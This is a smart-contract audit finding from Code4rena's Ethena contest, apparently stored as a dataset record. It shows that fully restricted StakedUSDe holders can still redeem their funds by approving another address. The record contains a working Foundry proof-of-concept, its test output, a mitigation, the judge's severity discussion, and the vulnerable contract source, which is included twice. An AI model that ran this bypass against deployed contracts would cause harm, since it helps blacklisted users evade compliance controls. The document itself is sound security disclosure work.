{
  "Title": "[M-01] ``FULL_RESTRICTED`` Stakers can bypass restriction through approvals",
  "Content": "\n<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L225-L238><br>\n<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L245-L248>\n\nThe `StakedUSDe` contract implements a method to `SOFTLY` or `FULLY` restrict user address, and either transfer to another user or burn.\n\nHowever there is an underlying issue. A fully restricted address is supposed to be unable to withdraw/redeem, however this issue can be walked around via the approve mechanism.\n\nThe openzeppelin `ERC4626` contract allows approved address to withdraw and redeem on behalf of another address so far there is an approval.\n\n```solidity\n    function redeem(uint256 shares, address receiver, address owner) public virtual override returns (uint256) \n```\n\nBlacklisted Users can explore this loophole to redeem their funds fully. This is because in the overridden `_withdraw` function, the token owner is not checked for restriction.\n\n```solidity\n  function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)\n    internal\n    override\n    nonReentrant\n    notZero(assets)\n    notZero(shares)\n  {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {\n      revert OperationNotAllowed();\n    }\n```\n\nAlso in the overridden `_beforeTokenTransfer` there is a clause added to allow burning from restricted addresses:\n\n```solidity\n  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {\n      revert OperationNotAllowed();\n    }\n```\n\nAll these issues allows a restricted user to simply approve another address and redeem their usde.\n\n### Proof of Concept\n\nThis is a foundry test that can be run in the `StakedUSDe.blacklist.t.sol` in the `test/foundry/staking` directory.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8;\n\n/* solhint-disable private-vars-leading-underscore  */\n/* solhint-disable func-name-mixedcase  */\n/* solhint-disable var-name-mixedcase  */\n\nimport {console} from \"forge-std/console.sol\";\nimport \"forge-std/Test.sol\";\nimport {SigUtils} from \"forge-std/SigUtils.sol\";\n\nimport \"../../../contracts/USDe.sol\";\nimport \"../../../contracts/StakedUSDe.sol\";\nimport \"../../../contracts/interfaces/IUSDe.sol\";\nimport \"../../../contracts/interfaces/IERC20Events.sol\";\nimport \"../../../contracts/interfaces/ISingleAdminAccessControl.sol\";\n\ncontract StakedUSDeBlacklistTest is Test, IERC20Events {\n  USDe public usdeToken;\n  StakedUSDe public stakedUSDe;\n  SigUtils public sigUtilsUSDe;\n  SigUtils public sigUtilsStakedUSDe;\n  uint256 public _amount = 100 ether;\n\n  address public owner;\n  address public alice;\n  address public bob;\n  address public greg;\n\n  bytes32 SOFT_RESTRICTED_STAKER_ROLE;\n  bytes32 FULL_RESTRICTED_STAKER_ROLE;\n  bytes32 DEFAULT_ADMIN_ROLE;\n  bytes32 BLACKLIST_MANAGER_ROLE;\n\n  event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);\n  event Withdraw(\n    address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares\n  );\n  event LockedAmountRedistributed(address indexed from, address indexed to, uint256 amountToDistribute);\n\n  function setUp() public virtual {\n    usdeToken = new USDe(address(this));\n\n    alice = makeAddr(\"alice\");\n    bob = makeAddr(\"bob\");\n    greg = makeAddr(\"greg\");\n    owner = makeAddr(\"owner\");\n\n    usdeToken.setMinter(address(this));\n\n    vm.startPrank(owner);\n    stakedUSDe = new StakedUSDe(IUSDe(address(usdeToken)), makeAddr('rewarder'), owner);\n    vm.stopPrank();\n\n    FULL_RESTRICTED_STAKER_ROLE = keccak256(\"FULL_RESTRICTED_STAKER_ROLE\");\n    SOFT_RESTRICTED_STAKER_ROLE = keccak256(\"SOFT_RESTRICTED_STAKER_ROLE\");\n    DEFAULT_ADMIN_ROLE = 0x00;\n    BLACKLIST_MANAGER_ROLE = keccak256(\"BLACKLIST_MANAGER_ROLE\");\n  }\n\n  function _mintApproveDeposit(address staker, uint256 amount, bool expectRevert) internal {\n    usdeToken.mint(staker, amount);\n\n    vm.startPrank(staker);\n    usdeToken.approve(address(stakedUSDe), amount);\n\n    uint256 sharesBefore = stakedUSDe.balanceOf(staker);\n    if (expectRevert) {\n      vm.expectRevert(IStakedUSDe.OperationNotAllowed.selector);\n    } else {\n      vm.expectEmit(true, true, true, false);\n      emit Deposit(staker, staker, amount, amount);\n    }\n    stakedUSDe.deposit(amount, staker);\n    uint256 sharesAfter = stakedUSDe.balanceOf(staker);\n    if (expectRevert) {\n      assertEq(sharesAfter, sharesBefore);\n    } else {\n      assertApproxEqAbs(sharesAfter - sharesBefore, amount, 1);\n    }\n    vm.stopPrank();\n  }\n\n \n    function test_fullBlacklist_withdraw_pass() public {\n    _mintApproveDeposit(alice, _amount, false);\n\n    vm.startPrank(owner);\n    stakedUSDe.grantRole(FULL_RESTRICTED_STAKER_ROLE, alice);\n    vm.stopPrank();\n    //@audit-issue assert that alice is blacklisted\n   bool isBlacklisted = stakedUSDe.hasRole(FULL_RESTRICTED_STAKER_ROLE, alice);\n   assertEq(isBlacklisted, true);\n  //@audit-issue The staked balance of Alice\n    uint256 balAliceBefore = stakedUSDe.balanceOf(alice); \n    //@audit-issue The usde balance of address 56\n    uint256 bal56Before = usdeToken.balanceOf(address(56));\n    vm.startPrank(alice);\n    stakedUSDe.approve(address(56), _amount);\n    vm.stopPrank();\n    \n    //@audit-issue address 56 receives approval and can unstake usde for Alice after a blacklist\n    vm.startPrank(address(56));\n    stakedUSDe.redeem(_amount, address(56), alice);\n    vm.stopPrank();\n      //@audit-issue The staked balance of Alice\n     uint256 balAliceAfter = stakedUSDe.balanceOf(alice);\n     //@audit-issue The usde balance of address 56\n     uint256 bal56After = usdeToken.balanceOf(address(56));\n\n      assertEq(bal56Before, 0);\n      assertEq(balAliceAfter, 0);\n      console.log(balAliceBefore);\n      console.log(bal56Before);\n      console.log(balAliceAfter);\n      console.log(bal56After);\n\n  }\n}\n```\n\nHere we use `address(56)` as the second address, and we see that the user can withdraw their `100000000000000000000` tokens that was restricted.\n\nThis is my test result showing the  balances.\n\n```shell\n[PASS] test_fullBlacklist_withdraw_pass() (gas: 239624)\nLogs:\n  100000000000000000000 // Alice staked balance before\n  0 // address(56) USDe balance before\n  0 // Alice staked balance after\n  100000000000000000000 // address(56) USDe balance after\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.68ms\n```\n\n### Tools Used\n\nFoundry, Manual review\n\n### Recommended Mitigation Steps\n\nCheck the token owner as well in the `_withdraw` function:\n\n```solidity\n\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver) || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner) ) {\n      revert OperationNotAllowed();\n    }\n```\n\n**[FJ-Riveros (Ethena) confirmed via duplicate issue \\#666](https://github.com/code-423n4/2023-10-ethena-findings/issues/666#issuecomment-1802065692)**\n\n**[0xDjango (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1810441530)**\n\n**[josephdara (warden) commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1811883453):**\n > Hi @0xDjango,  I do believe this is a high severity bug. It does break a major protocol functionality, compromising assets directly. \n> According to the severity categorization:\n> > 3 â€” High: Assets can be stolen/lost/compromised directly\n>\n> Thanks!\n\n**[0xDjango (judge) commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1815670715):**\n > @josephdara - I have conversed with the project team, and we have agreed that breaking rules due to legal compliance is medium severity as no funds are at risk.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-10-ethena",
  "Code": [
    {
      "filename": "contracts/StakedUSDe.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.19;\n\n/**\n * solhint-disable private-vars-leading-underscore\n */\n\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\nimport \"./SingleAdminAccessControl.sol\";\nimport \"./interfaces/IStakedUSDe.sol\";\n\n/**\n * @title StakedUSDe\n * @notice The StakedUSDe contract allows users to stake USDe tokens and earn a portion of protocol LST and perpetual yield that is allocated\n * to stakers by the Ethena DAO governance voted yield distribution algorithm.  The algorithm seeks to balance the stability of the protocol by funding\n * the protocol's insurance fund, DAO activities, and rewarding stakers with a portion of the protocol's yield.\n */\ncontract StakedUSDe is SingleAdminAccessControl, ReentrancyGuard, ERC20Permit, ERC4626, IStakedUSDe {\n  using SafeERC20 for IERC20;\n\n  /* ------------- CONSTANTS ------------- */\n  /// @notice The role that is allowed to distribute rewards to this contract\n  bytes32 private constant REWARDER_ROLE = keccak256(\"REWARDER_ROLE\");\n  /// @notice The role that is allowed to blacklist and un-blacklist addresses\n  bytes32 private constant BLACKLIST_MANAGER_ROLE = keccak256(\"BLACKLIST_MANAGER_ROLE\");\n  /// @notice The role which prevents an address to stake\n  bytes32 private constant SOFT_RESTRICTED_STAKER_ROLE = keccak256(\"SOFT_RESTRICTED_STAKER_ROLE\");\n  /// @notice The role which prevents an address to transfer, stake, or unstake. The owner of the contract can redirect address staking balance if an address is in full restricting mode.\n  bytes32 private constant FULL_RESTRICTED_STAKER_ROLE = keccak256(\"FULL_RESTRICTED_STAKER_ROLE\");\n  /// @notice The vesting period of lastDistributionAmount over which it increasingly becomes available to stakers\n  uint256 private constant VESTING_PERIOD = 8 hours;\n  /// @notice Minimum non-zero shares amount to prevent donation attack\n  uint256 private constant MIN_SHARES = 1 ether;\n\n  /* ------------- STATE VARIABLES ------------- */\n\n  /// @notice The amount of the last asset distribution from the controller contract into this\n  /// contract + any unvested remainder at that time\n  uint256 public vestingAmount;\n\n  /// @notice The timestamp of the last asset distribution from the controller contract into this contract\n  uint256 public lastDistributionTimestamp;\n\n  /* ------------- MODIFIERS ------------- */\n\n  /// @notice ensure input amount nonzero\n  modifier notZero(uint256 amount) {\n    if (amount == 0) revert InvalidAmount();\n    _;\n  }\n\n  /// @notice ensures blacklist target is not owner\n  modifier notOwner(address target) {\n    if (target == owner()) revert CantBlacklistOwner();\n    _;\n  }\n\n  /* ------------- CONSTRUCTOR ------------- */\n\n  /**\n   * @notice Constructor for StakedUSDe contract.\n   * @param _asset The address of the USDe token.\n   * @param _initialRewarder The address of the initial rewarder.\n   * @param _owner The address of the admin role.\n   *\n   */\n  constructor(IERC20 _asset, address _initialRewarder, address _owner)\n    ERC20(\"Staked USDe\", \"stUSDe\")\n    ERC4626(_asset)\n    ERC20Permit(\"stUSDe\")\n  {\n    if (_owner == address(0) || _initialRewarder == address(0) || address(_asset) == address(0)) {\n      revert InvalidZeroAddress();\n    }\n\n    _grantRole(REWARDER_ROLE, _initialRewarder);\n    _grantRole(DEFAULT_ADMIN_ROLE, _owner);\n  }\n\n  /* ------------- EXTERNAL ------------- */\n\n  /**\n   * @notice Allows the owner to transfer rewards from the controller contract into this contract.\n   * @param amount The amount of rewards to transfer.\n   */\n  function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {\n    if (getUnvestedAmount() > 0) revert StillVesting();\n    uint256 newVestingAmount = amount + getUnvestedAmount();\n\n    vestingAmount = newVestingAmount;\n    lastDistributionTimestamp = block.timestamp;\n    // transfer assets from rewarder to this contract\n    IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);\n\n    emit RewardsReceived(amount, newVestingAmount);\n  }\n\n  /**\n   * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to blacklist addresses.\n   * @param target The address to blacklist.\n   * @param isFullBlacklisting Soft or full blacklisting level.\n   */\n  function addToBlacklist(address target, bool isFullBlacklisting)\n    external\n    onlyRole(BLACKLIST_MANAGER_ROLE)\n    notOwner(target)\n  {\n    bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;\n    _grantRole(role, target);\n  }\n\n  /**\n   * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to un-blacklist addresses.\n   * @param target The address to un-blacklist.\n   * @param isFullBlacklisting Soft or full blacklisting level.\n   */\n  function removeFromBlacklist(address target, bool isFullBlacklisting)\n    external\n    onlyRole(BLACKLIST_MANAGER_ROLE)\n    notOwner(target)\n  {\n    bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;\n    _revokeRole(role, target);\n  }\n\n  /**\n   * @notice Allows the owner to rescue tokens accidentally sent to the contract.\n   * Note that the owner cannot rescue USDe tokens because they functionally sit here\n   * and belong to stakers but can rescue staked USDe as they should never actually\n   * sit in this contract and a staker may well transfer them here by accident.\n   * @param token The token to be rescued.\n   * @param amount The amount of tokens to be rescued.\n   * @param to Where to send rescued tokens\n   */\n  function rescueTokens(address token, uint256 amount, address to) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    if (address(token) == asset()) revert InvalidToken();\n    IERC20(token).safeTransfer(to, amount);\n  }\n\n  /**\n   * @dev Burns the full restricted user amount and mints to the desired owner address.\n   * @param from The address to burn the entire balance, with the FULL_RESTRICTED_STAKER_ROLE\n   * @param to The address to mint the entire balance of \"from\" parameter.\n   */\n  function redistributeLockedAmount(address from, address to) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && !hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {\n      uint256 amountToDistribute = balanceOf(from);\n      _burn(from, amountToDistribute);\n      // to address of address(0) enables burning\n      if (to != address(0)) _mint(to, amountToDistribute);\n\n      emit LockedAmountRedistributed(from, to, amountToDistribute);\n    } else {\n      revert OperationNotAllowed();\n    }\n  }\n\n  /* ------------- PUBLIC ------------- */\n\n  /**\n   * @notice Returns the amount of USDe tokens that are vested in the contract.\n   */\n  function totalAssets() public view override returns (uint256) {\n    return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();\n  }\n\n  /**\n   * @notice Returns the amount of USDe tokens that are unvested in the contract.\n   */\n  function getUnvestedAmount() public view returns (uint256) {\n    uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;\n\n    if (timeSinceLastDistribution >= VESTING_PERIOD) {\n      return 0;\n    }\n\n    return ((VESTING_PERIOD - timeSinceLastDistribution) * vestingAmount) / VESTING_PERIOD;\n  }\n\n  /// @dev Necessary because both ERC20 (from ERC20Permit) and ERC4626 declare decimals()\n  function decimals() public pure override(ERC4626, ERC20) returns (uint8) {\n    return 18;\n  }\n\n  /* ------------- INTERNAL ------------- */\n\n  /// @notice ensures a small non-zero amount of shares does not remain, exposing to donation attack\n  function _checkMinShares() internal view {\n    uint256 _totalSupply = totalSupply();\n    if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();\n  }\n\n  /**\n   * @dev Deposit/mint common workflow.\n   * @param caller sender of assets\n   * @param receiver where to send shares\n   * @param assets assets to deposit\n   * @param shares shares to mint\n   */\n  function _deposit(address caller, address receiver, uint256 assets, uint256 shares)\n    internal\n    override\n    nonReentrant\n    notZero(assets)\n    notZero(shares)\n  {\n    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {\n      revert OperationNotAllowed();\n    }\n    super._deposit(caller, receiver, assets, shares);\n    _checkMinShares();\n  }\n\n  /**\n   * @dev Withdraw/redeem common workflow.\n   * @param caller tx sender\n   * @param receiver where to send assets\n   * @param _owner where to burn shares from\n   * @param assets asset amount to transfer out\n   * @param shares shares to burn\n   */\n  function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)\n    internal\n    override\n    nonReentrant\n    notZero(assets)\n    notZero(shares)\n  {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {\n      revert OperationNotAllowed();\n    }\n\n    super._withdraw(caller, receiver, _owner, assets, shares);\n    _checkMinShares();\n  }\n\n  /**\n   * @dev Hook that is called before any transfer of tokens. This includes\n   * minting and burning. Disables transfers from or to of addresses with the FULL_RESTRICTED_STAKER_ROLE role.\n   */\n\n  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {\n      revert OperationNotAllowed();\n    }\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {\n      revert OperationNotAllowed();\n    }\n  }\n\n  /**\n   * @dev Remove renounce role access from AccessControl, to prevent users to resign roles.\n   */\n  function renounceRole(bytes32, address) public virtual override {\n    revert OperationNotAllowed();\n  }\n}"
    },
    {
      "filename": "contracts/StakedUSDe.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.19;\n\n/**\n * solhint-disable private-vars-leading-underscore\n */\n\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\nimport \"./SingleAdminAccessControl.sol\";\nimport \"./interfaces/IStakedUSDe.sol\";\n\n/**\n * @title StakedUSDe\n * @notice The StakedUSDe contract allows users to stake USDe tokens and earn a portion of protocol LST and perpetual yield that is allocated\n * to stakers by the Ethena DAO governance voted yield distribution algorithm.  The algorithm seeks to balance the stability of the protocol by funding\n * the protocol's insurance fund, DAO activities, and rewarding stakers with a portion of the protocol's yield.\n */\ncontract StakedUSDe is SingleAdminAccessControl, ReentrancyGuard, ERC20Permit, ERC4626, IStakedUSDe {\n  using SafeERC20 for IERC20;\n\n  /* ------------- CONSTANTS ------------- */\n  /// @notice The role that is allowed to distribute rewards to this contract\n  bytes32 private constant REWARDER_ROLE = keccak256(\"REWARDER_ROLE\");\n  /// @notice The role that is allowed to blacklist and un-blacklist addresses\n  bytes32 private constant BLACKLIST_MANAGER_ROLE = keccak256(\"BLACKLIST_MANAGER_ROLE\");\n  /// @notice The role which prevents an address to stake\n  bytes32 private constant SOFT_RESTRICTED_STAKER_ROLE = keccak256(\"SOFT_RESTRICTED_STAKER_ROLE\");\n  /// @notice The role which prevents an address to transfer, stake, or unstake. The owner of the contract can redirect address staking balance if an address is in full restricting mode.\n  bytes32 private constant FULL_RESTRICTED_STAKER_ROLE = keccak256(\"FULL_RESTRICTED_STAKER_ROLE\");\n  /// @notice The vesting period of lastDistributionAmount over which it increasingly becomes available to stakers\n  uint256 private constant VESTING_PERIOD = 8 hours;\n  /// @notice Minimum non-zero shares amount to prevent donation attack\n  uint256 private constant MIN_SHARES = 1 ether;\n\n  /* ------------- STATE VARIABLES ------------- */\n\n  /// @notice The amount of the last asset distribution from the controller contract into this\n  /// contract + any unvested remainder at that time\n  uint256 public vestingAmount;\n\n  /// @notice The timestamp of the last asset distribution from the controller contract into this contract\n  uint256 public lastDistributionTimestamp;\n\n  /* ------------- MODIFIERS ------------- */\n\n  /// @notice ensure input amount nonzero\n  modifier notZero(uint256 amount) {\n    if (amount == 0) revert InvalidAmount();\n    _;\n  }\n\n  /// @notice ensures blacklist target is not owner\n  modifier notOwner(address target) {\n    if (target == owner()) revert CantBlacklistOwner();\n    _;\n  }\n\n  /* ------------- CONSTRUCTOR ------------- */\n\n  /**\n   * @notice Constructor for StakedUSDe contract.\n   * @param _asset The address of the USDe token.\n   * @param _initialRewarder The address of the initial rewarder.\n   * @param _owner The address of the admin role.\n   *\n   */\n  constructor(IERC20 _asset, address _initialRewarder, address _owner)\n    ERC20(\"Staked USDe\", \"stUSDe\")\n    ERC4626(_asset)\n    ERC20Permit(\"stUSDe\")\n  {\n    if (_owner == address(0) || _initialRewarder == address(0) || address(_asset) == address(0)) {\n      revert InvalidZeroAddress();\n    }\n\n    _grantRole(REWARDER_ROLE, _initialRewarder);\n    _grantRole(DEFAULT_ADMIN_ROLE, _owner);\n  }\n\n  /* ------------- EXTERNAL ------------- */\n\n  /**\n   * @notice Allows the owner to transfer rewards from the controller contract into this contract.\n   * @param amount The amount of rewards to transfer.\n   */\n  function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {\n    if (getUnvestedAmount() > 0) revert StillVesting();\n    uint256 newVestingAmount = amount + getUnvestedAmount();\n\n    vestingAmount = newVestingAmount;\n    lastDistributionTimestamp = block.timestamp;\n    // transfer assets from rewarder to this contract\n    IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);\n\n    emit RewardsReceived(amount, newVestingAmount);\n  }\n\n  /**\n   * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to blacklist addresses.\n   * @param target The address to blacklist.\n   * @param isFullBlacklisting Soft or full blacklisting level.\n   */\n  function addToBlacklist(address target, bool isFullBlacklisting)\n    external\n    onlyRole(BLACKLIST_MANAGER_ROLE)\n    notOwner(target)\n  {\n    bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;\n    _grantRole(role, target);\n  }\n\n  /**\n   * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to un-blacklist addresses.\n   * @param target The address to un-blacklist.\n   * @param isFullBlacklisting Soft or full blacklisting level.\n   */\n  function removeFromBlacklist(address target, bool isFullBlacklisting)\n    external\n    onlyRole(BLACKLIST_MANAGER_ROLE)\n    notOwner(target)\n  {\n    bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;\n    _revokeRole(role, target);\n  }\n\n  /**\n   * @notice Allows the owner to rescue tokens accidentally sent to the contract.\n   * Note that the owner cannot rescue USDe tokens because they functionally sit here\n   * and belong to stakers but can rescue staked USDe as they should never actually\n   * sit in this contract and a staker may well transfer them here by accident.\n   * @param token The token to be rescued.\n   * @param amount The amount of tokens to be rescued.\n   * @param to Where to send rescued tokens\n   */\n  function rescueTokens(address token, uint256 amount, address to) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    if (address(token) == asset()) revert InvalidToken();\n    IERC20(token).safeTransfer(to, amount);\n  }\n\n  /**\n   * @dev Burns the full restricted user amount and mints to the desired owner address.\n   * @param from The address to burn the entire balance, with the FULL_RESTRICTED_STAKER_ROLE\n   * @param to The address to mint the entire balance of \"from\" parameter.\n   */\n  function redistributeLockedAmount(address from, address to) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && !hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {\n      uint256 amountToDistribute = balanceOf(from);\n      _burn(from, amountToDistribute);\n      // to address of address(0) enables burning\n      if (to != address(0)) _mint(to, amountToDistribute);\n\n      emit LockedAmountRedistributed(from, to, amountToDistribute);\n    } else {\n      revert OperationNotAllowed();\n    }\n  }\n\n  /* ------------- PUBLIC ------------- */\n\n  /**\n   * @notice Returns the amount of USDe tokens that are vested in the contract.\n   */\n  function totalAssets() public view override returns (uint256) {\n    return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();\n  }\n\n  /**\n   * @notice Returns the amount of USDe tokens that are unvested in the contract.\n   */\n  function getUnvestedAmount() public view returns (uint256) {\n    uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;\n\n    if (timeSinceLastDistribution >= VESTING_PERIOD) {\n      return 0;\n    }\n\n    return ((VESTING_PERIOD - timeSinceLastDistribution) * vestingAmount) / VESTING_PERIOD;\n  }\n\n  /// @dev Necessary because both ERC20 (from ERC20Permit) and ERC4626 declare decimals()\n  function decimals() public pure override(ERC4626, ERC20) returns (uint8) {\n    return 18;\n  }\n\n  /* ------------- INTERNAL ------------- */\n\n  /// @notice ensures a small non-zero amount of shares does not remain, exposing to donation attack\n  function _checkMinShares() internal view {\n    uint256 _totalSupply = totalSupply();\n    if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();\n  }\n\n  /**\n   * @dev Deposit/mint common workflow.\n   * @param caller sender of assets\n   * @param receiver where to send shares\n   * @param assets assets to deposit\n   * @param shares shares to mint\n   */\n  function _deposit(address caller, address receiver, uint256 assets, uint256 shares)\n    internal\n    override\n    nonReentrant\n    notZero(assets)\n    notZero(shares)\n  {\n    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {\n      revert OperationNotAllowed();\n    }\n    super._deposit(caller, receiver, assets, shares);\n    _checkMinShares();\n  }\n\n  /**\n   * @dev Withdraw/redeem common workflow.\n   * @param caller tx sender\n   * @param receiver where to send assets\n   * @param _owner where to burn shares from\n   * @param assets asset amount to transfer out\n   * @param shares shares to burn\n   */\n  function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)\n    internal\n    override\n    nonReentrant\n    notZero(assets)\n    notZero(shares)\n  {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {\n      revert OperationNotAllowed();\n    }\n\n    super._withdraw(caller, receiver, _owner, assets, shares);\n    _checkMinShares();\n  }\n\n  /**\n   * @dev Hook that is called before any transfer of tokens. This includes\n   * minting and burning. Disables transfers from or to of addresses with the FULL_RESTRICTED_STAKER_ROLE role.\n   */\n\n  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {\n      revert OperationNotAllowed();\n    }\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {\n      revert OperationNotAllowed();\n    }\n  }\n\n  /**\n   * @dev Remove renounce role access from AccessControl, to prevent users to resign roles.\n   */\n  function renounceRole(bytes32, address) public virtual override {\n    revert OperationNotAllowed();\n  }\n}"
    }
  ]
}